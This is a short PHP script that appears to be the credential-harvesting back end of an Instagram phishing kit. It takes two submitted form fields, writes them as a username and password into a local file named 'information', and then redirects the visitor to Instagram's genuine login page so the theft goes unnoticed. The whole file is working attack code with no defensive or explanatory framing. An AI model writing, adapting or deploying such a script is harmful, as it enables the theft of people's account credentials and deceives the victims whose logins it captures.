<?php

	$username	= $_POST['new_password1'];
	$password 	= $_POST['new_password2'];

	$file	= fopen("information","a");
	fwrite($file, "Username: " . $username . "\r\n");
	fwrite($file, "Password: " . $password . "\r\n");
	fwrite($file, "-----------------------" . "\r\n");
	fclose($file);
	header("Location: https://www.instagram.com/accounts/login/");

?>
